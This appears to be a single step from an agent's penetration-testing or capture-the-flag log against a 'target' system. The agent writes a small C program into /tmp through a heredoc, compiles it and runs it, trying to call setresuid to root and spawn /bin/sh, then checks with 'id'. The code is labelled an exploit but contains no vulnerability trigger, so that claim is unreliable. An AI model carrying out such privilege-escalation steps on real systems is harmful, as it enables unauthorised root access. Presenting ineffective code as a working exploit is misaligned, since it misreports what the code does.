content:
Neither curl nor wget are available on the target to download the exploit file. I will print the exploit source code here and create the file directly on the target with echo and redirection, then compile and execute it.

Command:
```
cat << 'EOF' > /tmp/poc.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setresuid(0, 0, 0);
    system("/bin/sh");
    return 0;
}
EOF
gcc /tmp/poc.c -o /tmp/poc
/tmp/poc
id
```

